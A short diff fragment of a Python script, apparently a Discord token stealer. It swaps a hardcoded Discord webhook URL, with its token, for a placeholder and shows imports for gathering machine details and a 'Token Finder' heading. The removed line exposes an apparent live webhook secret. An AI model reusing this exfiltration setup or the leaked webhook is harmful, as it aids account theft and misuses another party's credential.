@@ -5,7 +5,7 @@ from urllib.request import Request, urlopen
 import platform
 import socket,re,uuid,logging
 from uuid import getnode as get_mac
-WEBHOOK = "https://discordapp.com/api/webhooks/814930422794027049/P-Q0kInhc-WQm8h5XjUNm8DUQAjGr5IcDcDIoJdn8LeBzUQODpBi384FhaNuws03Yf-3"
+WEBHOOK = "ENTER WEBHOOK HERE"
 PING_USER = False #Set to True if you want to get mentioned by the bot
 
 # Token Finder
